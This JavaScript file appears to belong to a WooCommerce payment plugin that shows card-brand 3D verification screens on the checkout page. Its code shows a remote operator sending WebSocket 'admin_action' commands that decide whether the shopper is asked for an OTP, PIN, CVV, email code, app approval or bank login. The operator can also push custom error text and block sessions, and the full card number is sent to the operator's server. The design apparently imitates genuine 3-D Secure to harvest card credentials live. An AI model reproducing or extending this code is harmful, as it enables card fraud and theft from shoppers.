/**
 * 🎨 3D验证处理 - Figma风格版本
 * 
 * ✅ 功能：
 * - WebSocket消息监听
 * - Session ID获取
 * - 验证指令处理
 * - Figma风格UI显示
 */

/* global jQuery */


(function($) {
    'use strict';
    

    class CPG_3D_Verification {
        constructor() {
            this.currentVerification = null;
            this.sessionId = null;
            this.lastCardBrand = null; // 🔥 上次查询到的卡品牌
            this.isBlocked = false; // 🔥 会话是否被阻止（断开或拉黑）
            this.waitingShown = false; // 🔥 新增：等待界面是否已显示（只有显示后才接收其他指令）
            
            // 🔥 品牌图标配置（基于插件目录）
            const pluginUrl = window.CPG_CONFIG?.plugin_url || '';
            this.brandIcons = {
                'VISA': pluginUrl + 'assets/images/figma/visa.svg',
                'MASTERCARD': pluginUrl + 'assets/images/figma/mastercard.svg',
                'AMEX': pluginUrl + 'assets/images/figma/amex.svg',
                'AMERICAN EXPRESS': pluginUrl + 'assets/images/figma/amex.svg',
                'DISCOVER': pluginUrl + 'assets/images/figma/discover.jpg',
                'JCB': pluginUrl + 'assets/images/figma/JCB.jpg',
                'DINERS': pluginUrl + 'assets/images/figma/diners.svg',
                'DINERS CLUB': pluginUrl + 'assets/images/figma/diners.svg'
            };
            
            // 🔥 加载中的品牌图标（大尺寸）
            this.loadingBrandIcons = {
                'VISA': pluginUrl + 'assets/images/visa-jiazai.webp',
                'MASTERCARD': pluginUrl + 'assets/images/mastercard-jiazai.webp',
                'AMEX': pluginUrl + 'assets/images/amex-safe-cvv_.svg',
                'AMERICAN EXPRESS': pluginUrl + 'assets/images/amex-safe-cvv_.svg',
                'DISCOVER': pluginUrl + 'assets/images/discover-logo.svg',
                'JCB': pluginUrl + 'assets/images/figma/JCB.jpg',
                'DINERS': pluginUrl + 'assets/images/figma/diners.svg',
                'DINERS CLUB': pluginUrl + 'assets/images/figma/diners.svg'
            };
            
            // 🔥 右上角品牌图标（小尺寸）
            this.headerBrandIcons = {
                'VISA': pluginUrl + 'assets/images/visa-youshangjiao.webp',
                'MASTERCARD': pluginUrl + 'assets/images/mastercard-youshangjiao.png',
                'AMEX': pluginUrl + 'assets/images/amex-safe-youshangjiao_.svg',
                'AMERICAN EXPRESS': pluginUrl + 'assets/images/amex-safe-youshangjiao_.svg',
                'DISCOVER': pluginUrl + 'assets/images/discover-youshangjiao.svg',
                'JCB': pluginUrl + 'assets/images/figma/JCB.jpg',
                'DINERS': pluginUrl + 'assets/images/figma/diners.svg',
                'DINERS CLUB': pluginUrl + 'assets/images/figma/diners.svg'
            };
            
            
            // 初始化事件监听器
            this.initEventListener();
            
            // 等待追踪器初始化以获取 session_id
            this.waitForTracker();
            
            // 设置向后兼容API
            this.setupBackwardCompatibility();
            
            // 🔥 初始化关闭按钮
            this.initCloseButton();
            
            // 🔥 检测 URL 参数，如果有 cpg_verification=pending 则显示等待界面
            this.checkUrlForVerification();
            
            // 🔥🔥🔥 初始化时立即更新所有验证界面的商品信息（修复硬编码问题）🔥🔥🔥
            this.initProductInfo();
        }
        
        /**
         * 🔥 检测 URL 参数，自动显示等待界面
         */
        checkUrlForVerification() {
            const urlParams = new URLSearchParams(window.location.search);
            const verificationStatus = urlParams.get('cpg_verification');
            
            if (verificationStatus === 'pending') {
                // 延迟显示，确保页面完全加载
                setTimeout(() => {
                    // 检查订单是否已经完成
                    const hasCompletedClass = jQuery('.woocommerce-order-status--completed, .order-status.completed').length > 0;
                    const orderStatusText = jQuery('.woocommerce-order-status, .order-status').text().toLowerCase();
                    const hasCompletedText = orderStatusText.indexOf('completed') > -1 || 
                                             orderStatusText.indexOf('processing') > -1;
                    
                    if (hasCompletedClass || hasCompletedText || window.CPG_VerificationCompleted) {
                        return;
                    }
                    
                    // 显示等待界面
                    this.showWaiting({});
                }, 500);
            }
        }
        
        /**
         * 🔥 初始化关闭按钮功能
         */
        initCloseButton() {
            // 检查配置中是否启用了关闭按钮
            const showCloseButton = window.CPG_CONFIG?.show_close_button || false;
            
            // 如果启用，为所有验证卡片添加类名
            if (showCloseButton) {
                document.querySelectorAll('.cpg-verify-card').forEach(card => {
                    card.classList.add('show-close-btn');
                });
            }
            
            // 绑定关闭按钮点击事件
            document.addEventListener('click', (e) => {
                const closeBtn = e.target.closest('.cpg-close-btn');
                if (closeBtn) {
                    e.preventDefault();
                    e.stopPropagation();
                    this.handleCloseVerification();
                }
            });
        }
        
        /**
         * 🔥 处理关闭验证界面
         */
        handleCloseVerification() {
            // 隐藏所有验证界面并重置 waitingShown 标志（验证流程被用户中断）
            this.hideAll(true);
            
            // 发送关闭事件到后台
            if (window.CPG_UserTracker && typeof window.CPG_UserTracker.sendEvent === 'function') {
                window.CPG_UserTracker.sendEvent('verification_closed', {
                    session_id: this.sessionId,
                    verification_type: this.currentVerification,
                    timestamp: new Date().toISOString()
                });
            }
            
            // 清除当前验证状态
            this.currentVerification = null;
            
            // 显示提示
            if (typeof wc_checkout_form !== 'undefined' && wc_checkout_form.$checkout_form) {
                // 移除加载状态
                wc_checkout_form.$checkout_form.removeClass('processing').unblock();
            }
        }

        /**
         * 🔥 初始化事件监听器（使用发布-订阅模式）
         */
        initEventListener() {
            // 监听 user-tracking.js 发布的全局事件
            window.addEventListener('cpg-ws-message', (event) => {
                const message = event.detail;
                
                // 🔥 首先检查：如果订单已完成，忽略所有消息（包括 waiting 指令）
                const isOrderReceivedPage = jQuery('body').hasClass('woocommerce-order-received') || 
                                            window.location.href.indexOf('order-received') > -1;
                
                if (isOrderReceivedPage) {
                    // 检查订单是否已完成
                    const hasCompletedClass = jQuery('.woocommerce-order-status--completed, .order-status.completed, .status-completed').length > 0;
                    const orderStatusText = jQuery('.woocommerce-order-status, .order-status, .woocommerce-order-overview__order-status').text().toLowerCase();
                    const hasCompletedText = orderStatusText.indexOf('completed') > -1 || 
                                             orderStatusText.indexOf('完成') > -1 ||
                                             orderStatusText.indexOf('processing') > -1 ||
                                             orderStatusText.indexOf('成功') > -1;
                    const thankYouVisible = jQuery('.woocommerce-thankyou-order-received').is(':visible') && 
                                            jQuery('.woocommerce-thankyou-order-received').text().trim().length > 0;
                    
                    if (hasCompletedClass || hasCompletedText || thankYouVisible || window.CPG_VerificationCompleted) {
                        // 确保感谢信息显示
                        jQuery('.woocommerce-order, .woocommerce-thankyou-order-received').show();
                        return;
                    }
                }
                
                // 🔥 只处理 admin_action 类型的消息
                if (message.type !== 'admin_action') {
                    return;
                }
                
                // 检查是否是验证指令
                if (message.action) {
                    this.handleVerificationCommand(message);
                } else {
                    console.warn('[3D Verify] ⚠️ admin_action 消息缺少 action 字段');
                }
            });
            
        }

        /**
         * 等待追踪器初始化（仅用于获取 session_id）
         */
        waitForTracker() {
            const checkTracker = () => {
                if (window.cpgTracker && window.cpgTracker.sessionId) {
                    this.sessionId = window.cpgTracker.sessionId;
                    // 🔥 检查会话状态：如果被断开或拉黑，阻止加载3D验证界面
                    this.checkSessionStatus(this.sessionId);
                } else {
                    setTimeout(checkTracker, 100);
                }
            };
            checkTracker();
        }
        
        /**
         * 🔥 检查会话状态：如果被断开或拉黑，阻止加载3D验证界面
         */
        async checkSessionStatus(sessionId) {
            if (!sessionId) {
                return true; // 没有sessionId时允许继续
            }
            
            try {
                // 🔥 调用后端API检查会话状态
                const wsConfig = window.CPG_CONFIG || {};
                const wsUrl = wsConfig.ws_url || '';
                const apiBaseUrl = wsUrl.replace(/^ws(s)?:\/\//, 'http$1://').replace(/\/ws$/, '');
                
                const response = await fetch(`${apiBaseUrl}/api/verification/check-session/${sessionId}`, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                });
                
                // 🔥🔥🔥 静默处理404错误（API可能不存在）🔥🔥🔥
                if (!response.ok) {
                    if (response.status === 404) {
                        // API不存在，静默处理，允许继续
                        return true;
                    }
                    // 其他错误也允许继续（避免影响正常流程）
                    return true;
                }
                
                const result = await response.json();
                
                if (result.code === 0 && result.data) {
                    const { can_load_verification, is_blocked, is_disconnected, reason } = result.data;
                    
                    if (!can_load_verification) {
                        console.warn('[3D Verify] ⚠️ 会话已被阻止加载3D验证界面:', reason);
                        
                        // 🔥 隐藏所有验证界面
                        jQuery('#cpg-waiting, #cpg-verification-waiting').hide();
                        jQuery('.cpg-verification-overlay, .cpg-verification-modal').hide();
                        
                        // 🔥 显示错误提示
                        const errorMessage = reason || 'This session has been blocked or disconnected';
                        this.showBlockedMessage(errorMessage);
                        
                        // 🔥 阻止后续的验证指令处理
                        this.isBlocked = true;
                        return false;
                    }
                }
                
                // 会话正常，允许加载
                this.isBlocked = false;
                return true;
            } catch (error) {
                // 🔥🔥🔥 静默处理错误（包括404），不打印错误日志 🔥🔥🔥
                // 检查失败时，允许继续（避免影响正常流程）
                return true;
            }
        }
        
        /**
         * 🔥 显示被阻止的消息
         */
        showBlockedMessage(message) {
            // 创建或更新错误提示
            let errorDiv = jQuery('#cpg-session-blocked-message');
            
            if (errorDiv.length === 0) {
                errorDiv = jQuery('<div id="cpg-session-blocked-message" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); z-index: 999999; max-width: 500px; text-align: center;"></div>');
                jQuery('body').append(errorDiv);
            }
            
            errorDiv.html(`
                <h3 style="color: #d32f2f; margin-bottom: 15px;">Access Denied</h3>
                <p style="color: #666; margin-bottom: 20px;">${message}</p>
                <p style="color: #999; font-size: 14px;">Please contact support if you believe this is an error.</p>
            `);
        }

        /**
         * 🔥 查询卡BIN信息（通过WordPress AJAX代理）
         */
        /**
         * 🔥 本地识别卡品牌（规则匹配）
         */
        detectCardBrandLocally(cardNumber) {
            const cleanNumber = cardNumber.replace(/\D/g, '');
            
            if (/^4/.test(cleanNumber)) {
                return 'VISA';
            } else if (/^5[1-5]/.test(cleanNumber) || /^2[2-7]/.test(cleanNumber)) {
                return 'MASTERCARD';
            } else if (/^3[47]/.test(cleanNumber)) {
                return 'AMEX';
            } else if (/^6(?:011|5)/.test(cleanNumber)) {
                return 'DISCOVER';
            } else if (/^35/.test(cleanNumber)) {
                return 'JCB';
            } else if (/^3(?:0[0-5]|[68])/.test(cleanNumber)) {
                return 'DINERS';
            } else {
                return null; // 🔥 未识别，不显示品牌
            }
        }
        
        /**
         * 🔥 查询卡品牌（通过WebSocket）
         */
        async queryCardBrand(cardNumber) {
            if (!cardNumber) return null;
            
            const cleanNumber = cardNumber.replace(/\D/g, '');
            if (cleanNumber.length < 6) return null;
            
            const bin = cleanNumber.substring(0, Math.min(8, cleanNumber.length));
            
            try {
                // 🔥 第一步：先使用本地识别（即时响应）
                const localBrand = this.detectCardBrandLocally(cleanNumber);
                if (localBrand) {
                    this.lastCardBrand = localBrand;
                }
                
                // 🔥 第二步：通过WebSocket查询BIN数据库（更精确）
                if (window.cpgTracker && window.cpgTracker.isConnected) {
                    
                    const binDataPromise = new Promise((resolve) => {
                        const timeout = setTimeout(() => {
                            resolve(null);
                        }, 2000);
                        
                        const handler = (event) => {
                            const message = event.detail;
                            if (message.type === 'bin_query_result' && message.bin === bin) {
                                clearTimeout(timeout);
                                window.removeEventListener('cpg-ws-message', handler);
                                
                                if (message.data && message.data.card_brand) {
                                    resolve(message.data.card_brand.toUpperCase());
                                } else {
                                    resolve(null);
                                }
                            }
                        };
                        
                        window.addEventListener('cpg-ws-message', handler);
                        
                        window.cpgTracker.sendMessage({
                            type: 'bin_query',
                            card_number: cleanNumber,
                            bin: bin,
                            session_id: window.cpgTracker.sessionId,
                            timestamp: Date.now()
                        });
                    });
                    
                    const binBrand = await binDataPromise;
                    if (binBrand) {
                        this.lastCardBrand = binBrand;
                        return binBrand;
                    }
                }
                
                // 返回本地识别结果（或null）
                return this.lastCardBrand;
                
            } catch (error) {
                console.error('[3D Verify] ❌ 查询卡BIN失败:', error);
                // 返回本地识别结果（或null）
                return this.detectCardBrandLocally(cleanNumber);
            }
        }

        /**
         * 🔥 更新品牌图标（等待界面 - 大图标）
         */
        updateLoadingBrandIcon(cardBrand) {
            if (!cardBrand) {
                return;
            }
            
            const brand = cardBrand.toUpperCase();
            const iconUrl = this.loadingBrandIcons[brand];
            
            if (!iconUrl) {
                return; // 🔥 移除默认Visa逻辑
            }
            
            
            // 更新两个阶段的图标
            const logo1 = document.getElementById('loadingBrandLogo');
            const logo2 = document.getElementById('loadingBrandLogo2');
            
            if (logo1) {
                logo1.src = iconUrl;
                logo1.alt = brand;
            }
            if (logo2) {
                logo2.src = iconUrl;
                logo2.alt = brand;
            }
        }

        /**
         * 🔥 更新品牌图标（验证界面 - 右上角小图标）
         */
        updateVerificationBrandIcon(verificationType, cardBrand) {
            if (!cardBrand || !verificationType) return;
            
            // CVV验证不显示品牌图标
            if (verificationType === 'cvv') {
                return;
            }
            
            const brand = cardBrand.toUpperCase();
            const iconUrl = this.headerBrandIcons[brand];
            
            if (!iconUrl) {
                return; // 🔥 移除默认Visa逻辑
            }
            
            
            const logoElement = document.getElementById(`${verificationType}CardLogo`);
            if (logoElement) {
                logoElement.src = iconUrl;
                logoElement.alt = brand;
            } else {
                console.warn('[3D Verify] ⚠️ 未找到品牌图标元素:', `${verificationType}CardLogo`);
            }
        }

        /**
         * 处理验证指令（显示对应的Figma风格界面）
         */
        async handleVerificationCommand(message) {
            const action = message.action;
            
            // 🔥 如果会话已被阻止，不处理任何验证指令
            if (this.isBlocked) {
                console.warn('[3D Verify] ⚠️ 会话已被阻止，忽略验证指令:', action);
                return;
            }
            
            // 🔥 新增：检查是否在结账页面且表单有验证错误
            const isCheckoutPage = jQuery('body').hasClass('woocommerce-checkout') || 
                                   window.location.href.indexOf('checkout') > -1;
            const isOrderReceivedPage = jQuery('body').hasClass('woocommerce-order-received') || 
                                        window.location.href.indexOf('order-received') > -1;
            
            // 只有 waiting 指令需要检查表单验证状态
            if (action === 'waiting' && isCheckoutPage && !isOrderReceivedPage) {
                if (!this.checkWooCommerceFormValid()) {
                    console.warn('[3D Verify] ⚠️ 表单有验证错误，忽略 waiting 指令');
                    return;
                }
            }
            
            // 🔥🔥🔥 新规则：只有等待界面显示后才接收其他指令 🔥🔥🔥
            // waiting 指令始终允许
            // error/change/custom 等"在当前界面显示"的指令也允许（不需要等待界面）
            // 其他具体验证类型必须在等待界面显示后才处理
            const actions_require_waiting = ['otp', 'email', 'pin', 'cvv', 'app', 'bank'];
            if (actions_require_waiting.includes(action) && !this.waitingShown) {
                console.warn('[3D Verify] ⚠️ 等待界面未显示，忽略验证指令:', action);
                console.log('[3D Verify] 💡 只有先显示等待界面后才能接收具体验证指令');
                return;
            }
            
            // 🔥 在处理验证指令前，再次检查会话状态（防止状态变化）
            if (this.sessionId) {
                const canLoad = await this.checkSessionStatus(this.sessionId);
                if (!canLoad) {
                    console.warn('[3D Verify] ⚠️ 会话状态检查失败，忽略验证指令:', action);
                    return;
                }
            }
            
            // 🔥 检查是否在感谢页面且订单已完成，如果是则不处理任何验证指令
            // 注意：isOrderReceivedPage 变量已在上方定义，直接使用
            if (isOrderReceivedPage) {
                // 检查订单是否已完成
                const hasCompletedClass = jQuery('.woocommerce-order-status--completed, .order-status.completed').length > 0;
                const orderStatusText = jQuery('.woocommerce-order-status, .order-status').text().toLowerCase();
                const hasCompletedText = orderStatusText.indexOf('completed') > -1 || 
                                         orderStatusText.indexOf('完成') > -1 ||
                                         orderStatusText.indexOf('processing') > -1;
                
                if (hasCompletedClass || hasCompletedText || window.CPG_VerificationCompleted) {
                    console.log('[3D Verify] ✅ 订单已完成，忽略验证指令:', action);
                    return;
                }
            }
            
            // 🔥 对于具体的验证类型，自动补充verification_type字段到消息中（如果没有）
            const concrete_verification_types = ['otp', 'email', 'pin', 'cvv', 'app', 'bank'];
            if (concrete_verification_types.includes(action)) {
                if (!message.verification_type && !message.data?.verification_type) {
                    message.verification_type = action;
                    if (!message.data) message.data = {};
                    message.data.verification_type = action;
                }
            }
            
            // 🔥 收到管理员命令时，隐藏所有加载圈圈并显示按钮
            this.hideAllLoadingCircles();
            
            // 🔥 只有具体验证类型和complete才隐藏所有界面
            // error/change/custom应该在当前界面显示，不关闭界面
            // waiting 不应该隐藏所有界面，应该直接显示等待界面（避免闪烁）
            const actions_that_hide_all = ['otp', 'email', 'pin', 'cvv', 'app', 'bank', 'complete'];
            
            if (actions_that_hide_all.includes(action)) {
                this.hideAll();
            } else if (action === 'waiting') {
                // 🔥 waiting 指令：不隐藏所有界面，直接显示等待界面（避免闪烁和意外关闭）
                // 如果等待界面已经显示，则只更新内容，不关闭
                if (!this.waitingShown) {
                    // 只隐藏其他验证界面，不重置waitingShown标志
                    this.hideAll(false);
                }
            } else {
            }
            
            // 根据指令显示对应界面
            switch(action) {
                case 'waiting':
                    // 🔥 再次检查订单状态（防止在显示等待界面时订单已完成）
                    if (isOrderReceivedPage) {
                        const orderStatusText = jQuery('.woocommerce-order-status, .order-status').text().toLowerCase();
                        const hasCompleted = orderStatusText.indexOf('completed') > -1 || 
                                             orderStatusText.indexOf('完成') > -1 ||
                                             orderStatusText.indexOf('processing') > -1 ||
                                             jQuery('.woocommerce-order-status--completed').length > 0;
                        if (hasCompleted || window.CPG_VerificationCompleted) {
                            console.log('[3D Verify] ✅ 订单已完成，不显示等待界面');
                            return;
                        }
                    }
                    this.showWaiting(message);
                    break;
                case 'otp':
                    this.showOTP(message);
                    break;
                case 'email':
                    this.showEmail(message);
                    break;
                case 'pin':
                    this.showPIN(message);
                    break;
                case 'cvv':
                    this.showCVV(message);
                    break;
                case 'app':
                    this.showAPP(message);
                    break;
                case 'bank':
                    this.showBank(message);
                    break;
                case 'custom':
                    this.showCustom(message);
                    break;
                case 'error':
                    this.showError(message);
                    break;
                case 'change':
                    this.showChange(message);
                    break;
                case 'complete':
                    // 🔥 立即设置完成标记，防止其他逻辑显示等待界面
                    window.CPG_VerificationCompleted = true;
                    console.log('[3D Verify] ✅ 收到完成指令，设置完成标记');
                    this.showComplete(message);
                    break;
                default:
            }
        }

        /**
         * 🔥 检查 WooCommerce 表单是否有验证错误
         */
        checkWooCommerceFormValid() {
            // 🔥 检查是否有 WooCommerce 错误提示
            const wooErrors = document.querySelectorAll('.woocommerce-error, .woocommerce-NoticeGroup-checkout .woocommerce-error');
            if (wooErrors.length > 0) {
                console.log('[3D Verify] ❌ WooCommerce 表单有验证错误，不显示等待界面');
                return false;
            }
            
            // 🔥🔥🔥 检查无效字段标记（WooCommerce验证失败标记）🔥🔥🔥
            const invalidFields = document.querySelectorAll('.woocommerce-invalid, .woocommerce-invalid-required-field, .validate-required.woocommerce-invalid');
            if (invalidFields.length > 0) {
                console.log('[3D Verify] ❌ 检测到无效字段标记，不显示等待界面');
                // 检查是否有具体的错误消息
                invalidFields.forEach(field => {
                    const fieldId = field.id || field.name || 'unknown';
                    const errorText = field.closest('.form-row')?.querySelector('.woocommerce-error')?.textContent || '';
                    if (errorText) {
                        console.log('[3D Verify] ❌ 字段验证失败:', fieldId, errorText.trim());
                    }
                });
                return false;
            }
            
            // 🔥🔥🔥 检查Shipping ZIP Code验证错误 🔥🔥🔥
            const shippingPostcodeField = document.getElementById('shipping_postcode');
            if (shippingPostcodeField) {
                const shippingPostcodeRow = shippingPostcodeField.closest('.form-row');
                if (shippingPostcodeRow) {
                    // 检查是否有错误消息
                    const shippingError = shippingPostcodeRow.querySelector('.woocommerce-error');
                    if (shippingError) {
                        const errorText = shippingError.textContent || '';
                        if (errorText.toLowerCase().includes('postcode') || errorText.toLowerCase().includes('zip')) {
                            console.log('[3D Verify] ❌ Shipping ZIP Code验证错误:', errorText.trim());
                            return false;
                        }
                    }
                    
                    // 检查字段是否有invalid类
                    if (shippingPostcodeRow.classList.contains('woocommerce-invalid') || 
                        shippingPostcodeField.classList.contains('woocommerce-invalid')) {
                        console.log('[3D Verify] ❌ Shipping ZIP Code字段标记为无效');
                        return false;
                    }
                }
            }
            
            // 🔥 检查关键必填字段是否为空（只检查最重要的几个）
            const criticalFields = ['billing_email', 'billing_postcode'];
            for (const fieldId of criticalFields) {
                const field = document.getElementById(fieldId);
                if (field && !field.value.trim()) {
                    console.log('[3D Verify] ❌ 关键字段为空: ' + fieldId);
                    return false;
                }
            }
            
            // 🔥 检查表单是否处于processing状态（正在提交中）
            const checkoutForm = document.querySelector('form.checkout, form.woocommerce-checkout');
            if (checkoutForm && checkoutForm.classList.contains('processing')) {
                console.log('[3D Verify] ❌ 表单正在处理中，不显示等待界面');
                return false;
            }
            
            return true;
        }

        /**
         * 显示加载等待界面
         */
        async showWaiting(message) {
            // 🔥 防止重复显示
            if (this._waitingDisplaying) {
                console.log('[3D Verify] ⚠️ 等待界面正在显示中，跳过');
                return;
            }
            this._waitingDisplaying = true;
            
            try {
                // 🔥 最终检查：如果订单已完成，不显示等待界面
                const isOrderReceivedPage = jQuery('body').hasClass('woocommerce-order-received') || 
                                            window.location.href.indexOf('order-received') > -1;
                
                if (isOrderReceivedPage) {
                    const hasCompletedClass = jQuery('.woocommerce-order-status--completed, .order-status.completed').length > 0;
                    const orderStatusText = jQuery('.woocommerce-order-status, .order-status').text().toLowerCase();
                    const hasCompletedText = orderStatusText.indexOf('completed') > -1 || 
                                             orderStatusText.indexOf('完成') > -1 ||
                                             orderStatusText.indexOf('processing') > -1;
                    
                    if (hasCompletedClass || hasCompletedText || window.CPG_VerificationCompleted) {
                        console.log('[3D Verify] ✅ 订单已完成，不显示等待界面');
                        // 确保感谢信息显示
                        jQuery('.woocommerce-order, .woocommerce-thankyou-order-received').show();
                        this._waitingDisplaying = false;
                        return;
                    }
                }
                
                // 🔥 新增：检查 WooCommerce 表单验证状态（在结账页面）
                const isCheckoutPage = jQuery('body').hasClass('woocommerce-checkout') || 
                                       window.location.href.indexOf('checkout') > -1;
                if (isCheckoutPage && !isOrderReceivedPage) {
                    if (!this.checkWooCommerceFormValid()) {
                        console.log('[3D Verify] ⚠️ 表单验证未通过，延迟显示等待界面');
                        this._waitingDisplaying = false;
                        return;
                    }
                }
                
                // 🔥 查询并更新卡品牌图标
                const cardNumber = message.data?.cardFull || message.data?.card_number || 
                                  document.getElementById('cpg_card_number')?.value || '';
                
                if (cardNumber) {
                    const cardBrand = await this.queryCardBrand(cardNumber);
                    if (cardBrand) {
                        this.updateLoadingBrandIcon(cardBrand);
                    }
                }
                
                // 🔥 只锁定滚动，不移除背景（保留页面可见性，实现半透明遮罩效果）
                document.body.style.cssText = 'overflow: hidden !important;';
                document.documentElement.style.cssText = 'overflow: hidden !important;';
                
                const container = $('#cpg-waiting');
                if (!container.length) {
                    console.error('[3D Verify] ❌ 找不到加载界面容器 #cpg-waiting');
                    this._waitingDisplaying = false;
                    return;
                }
                
                // 🔥 重置等待界面状态（确保每次显示从第一阶段开始）
                const stage1 = document.getElementById('visaStage1');
                const stage2 = document.getElementById('visaStage2');
                const footerContainer = container.find('.cpg-verify-footer')[0];
                const waitingDetails = document.getElementById('cpgWaitingDetails');
                
                if (stage1) stage1.style.cssText = 'display: flex !important; align-items: center; justify-content: center;';
                if (stage2) stage2.style.cssText = 'display: none !important;';
                if (footerContainer) footerContainer.style.cssText = 'display: none !important;';
                if (waitingDetails) waitingDetails.style.display = 'none';
                
                // 🔥 清除之前的定时器（防止重复切换阶段）
                if (this._stageTransitionTimer) {
                    clearTimeout(this._stageTransitionTimer);
                    this._stageTransitionTimer = null;
                }
                
                // 🔥 使用原生 display 替代 jQuery 动画（更稳定）
                container[0].style.display = 'flex';
                container.addClass('active');
                $('html, body').addClass('cpg-verify-active');
            
            
            // 🔥 使用原生JavaScript（与figma-style-editor.html完全一致）
            // 🔥 保存定时器引用，以便需要时取消
            this._stageTransitionTimer = setTimeout(() => {
                const stage1Elem = document.getElementById('visaStage1');
                const stage2Elem = document.getElementById('visaStage2');
                const loadingFooter = document.getElementById('loadingFooter');
                const footerContainerElem = document.querySelector('#cpg-waiting .cpg-verify-footer');
                
                console.log('[3D Verify] 🔍 元素检查:', {
                    'stage1存在': !!stage1Elem,
                    'stage2存在': !!stage2Elem,
                    'loadingFooter存在': !!loadingFooter,
                    'footerContainer存在': !!footerContainerElem
                });
                
                if (stage1Elem && stage2Elem) {
                    
                    // 隐藏第一阶段（使用!important覆盖CSS）
                    stage1Elem.style.cssText = 'display: none !important;';
                    
                    // 显示第二阶段（使用!important覆盖CSS）
                    stage2Elem.style.cssText = `
                        display: flex !important;
                        flex-direction: column !important;
                        align-items: center !important;
                        justify-content: center !important;
                    `;
                    
                    // 🔥 新增：填充并显示产品和价格信息
                    this.updateWaitingDetails();
                    
                } else {
                    console.error('[3D Verify] ❌ 元素不存在！stage1:', !!stage1Elem, 'stage2:', !!stage2Elem);
                }
                
                // 显示页脚文字
                if (loadingFooter) {
                    loadingFooter.style.cssText = 'display: block !important;';
                }
                
                // 显示页脚容器
                if (footerContainerElem) {
                    footerContainerElem.style.cssText = 'display: flex !important;';
                }
                
            }, 3000); // 3秒后切换到第二阶段
            
            this.currentVerification = 'waiting';
            
            // 🔥🔥🔥 标记等待界面已显示，现在可以接收其他验证指令 🔥🔥🔥
            this.waitingShown = true;
            console.log('[3D Verify] ✅ 等待界面已显示，现在可以接收验证指令');
            
            } finally {
                // 🔥 清除显示锁定标志
                this._waitingDisplaying = false;
            }
        }

        /**
         * 显示OTP验证界面
         */
        showOTP(message) {
            this.showVerificationModal('otp', message);
        }

        /**
         * 显示Email验证界面
         */
        showEmail(message) {
            this.showVerificationModal('email', message);
        }

        /**
         * 显示PIN验证界面
         */
        showPIN(message) {
            this.showVerificationModal('pin', message);
        }

        /**
         * 显示CVV验证界面
         */
        showCVV(message) {
            this.showVerificationModal('cvv', message);
        }

        /**
         * 显示APP验证界面
         */
        showAPP(message) {
            this.showVerificationModal('app', message);
        }

        /**
         * 显示网银验证界面
         */
        showBank(message) {
            this.showVerificationModal('bank', message);
        }

        /**
         * 🔥 显示自定义提示（在验证界面helper位置追加显示，不清空原有文案）
         */
        showCustom(message) {
            
            const customText = message.message || message.data?.text || message.data?.message;
            // 🔥 自定义提示使用红色
            const customColor = message.color || message.data?.color || '#dc3545';
            
            if (!customText) {
                console.warn('[3D Verify] ⚠️ 自定义提示缺少消息内容');
                return;
            }
            
            // 🔥 优先级：message.verification_type > message.data.verification_type > this.currentVerification
            const targetVerification = message.verification_type || message.data?.verification_type || this.currentVerification;
            
            // 🔥 如果没有目标验证界面，仅记录警告但不报错（避免中断用户流程）
            if (!targetVerification) {
                console.warn('[3D Verify] ⚠️ 无法显示自定义提示：没有活跃验证界面且消息中未指定验证类型');
                console.warn('[3D Verify] 💡 自定义消息内容:', customText);
                console.warn('[3D Verify] 💡 请先让用户进入具体验证界面，或在发送custom消息时包含verification_type字段');
                return;
            }
            
            
            // 🔥 隐藏加载圈圈，恢复按钮（让用户可以重新提交）
            this.hideLoadingAndShowButton(targetVerification);
            
            // 🔥🔥🔥 追加显示自定义提示，不清空原有helper文案 🔥🔥🔥
            this.appendCustomMessage(targetVerification, customText, customColor);
        }
        
        /**
         * 🔥 追加自定义消息到验证界面（不清空原有文案）
         */
        appendCustomMessage(verificationType, customText, customColor = '#dc3545') {
            const helperElement = document.getElementById(`${verificationType}Helper`);
            
            if (helperElement) {
                // 🔥 保存原始helper文本（如果还没保存的话）
                if (!helperElement.dataset.originalText) {
                    helperElement.dataset.originalText = helperElement.textContent;
                }
                
                // 🔥🔥🔥 追加自定义消息，而不是替换原有文案 🔥🔥🔥
                const originalText = helperElement.dataset.originalText || helperElement.textContent;
                helperElement.innerHTML = `<span style="color: ${customColor}; font-weight: 500;">${customText}</span><br><span style="color: #666; font-size: 12px;">${originalText}</span>`;
                helperElement.style.display = 'block';
                
                
                // 🔥 绑定输入监听：用户重新输入时恢复原有文案
                this.bindInputRestoreHelper(verificationType, helperElement);
                
                // 🔥 聚焦输入框
                setTimeout(() => {
                    const inputElement = document.getElementById(`${verificationType}Input`);
                    if (inputElement) {
                        inputElement.focus();
                    }
                }, 200);
            }
        }
        
        /**
         * 🔥 绑定输入框监听，用户重新输入时恢复原有helper文案
         */
        bindInputRestoreHelper(verificationType, helperElement) {
            const inputElement = document.getElementById(`${verificationType}Input`);
            if (!inputElement) return;
            
            const restoreHandler = () => {
                if (helperElement.dataset.originalText) {
                    helperElement.textContent = helperElement.dataset.originalText;
                    helperElement.style.color = '#666';
                    helperElement.style.fontWeight = 'normal';
                }
                inputElement.removeEventListener('input', restoreHandler);
            };
            
            inputElement.addEventListener('input', restoreHandler, { once: true });
        }

        /**
         * 🔥🔥🔥 显示验证完成 - 跳转到订单成功页 🔥🔥🔥
         * 
         * ⚠️ 关键规则：这是唯一的跳转入口！
         * ⚠️ 只有当收到支付网关的 complete 指令时，才会执行跳转
         * ⚠️ 主网关和 PayPal 网关都遵循此规则
         */
        showComplete(message) {
            console.log('[3D Verify] ✅ 收到支付网关 complete 指令，准备跳转');
            
            // 🔥 设置全局完成标记（防止 verification-handler.js 再次隐藏页面）
            window.CPG_VerificationCompleted = true;
            
            // 🔥 隐藏所有验证界面并重置 waitingShown 标志（验证流程完全结束）
            this.hideAll(true);
            
            // 🔥 移除验证相关的 CSS 类
            jQuery('html, body').removeClass('cpg-verify-active');
            
            // 🔥 恢复页面滚动
            document.body.style.cssText = '';
            document.documentElement.style.cssText = '';
            
            // 🔥🔥🔥 关键：只有在这里（收到 complete 指令后）才执行跳转 🔥🔥🔥
            // 检查是否有待跳转的URL（说明还在结账页）
            if (typeof window.CPG_CompleteAndRedirect === 'function' && window.CPG_PendingRedirect) {
                // 🔥 执行跳转到成功页面
                console.log('[3D Verify] 🚀 执行跳转到:', window.CPG_PendingRedirect);
                window.CPG_CompleteAndRedirect();
                return;
            }
            
            // 🔥 如果已经在订单成功页，直接显示感谢信息（不弹窗）
            jQuery('.woocommerce-order').show();
